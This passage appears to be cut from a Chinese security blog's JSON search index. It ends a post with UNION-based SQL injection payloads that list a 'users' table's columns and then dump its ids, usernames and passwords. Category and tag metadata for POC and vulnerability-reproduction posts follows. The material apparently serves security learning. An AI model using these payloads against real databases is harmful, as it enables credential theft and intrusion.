--+-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27;),3 --+-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 --+-1&#x27; union select 1,(select group_concat(id,username,password) from users),3 --+","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL注入,安全基础","slug":"SQL注入-安全基础","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"}]}],"categories":[{"name":"POC","slug":"POC","permalink":"http://example.com/categories/POC/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"Joomla","slug":"Joomla","permalink":"http://example.com/tags/Joomla/"},{"name":"Tomcat","slug":"Tomcat","permalink":"http://example.com/tags/Tomcat/"},{"name":"CouchDB","slug":"CouchDB","permalink":"http://example.com/tags/CouchDB/"},{"name":"Weblogic","slug":"Weblogic","permalink":"http://example.com/tags/Weblogic/"},{"name":"Struts2","slug":"Struts2","permalink":"http://example.com/tags/Struts2/"},{"name":"Shiro","slug":"Shiro","permalink":"http://example.com/tags/Shiro/"},{"name":"向日葵","slug":"向日葵","permalink":"http://example.com/tags/%E5%90%91%E6%97%A5%E8%91%B5/"},{"name":"SQL注入,安全基础","slug":"SQL注入-安全基础","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"}]}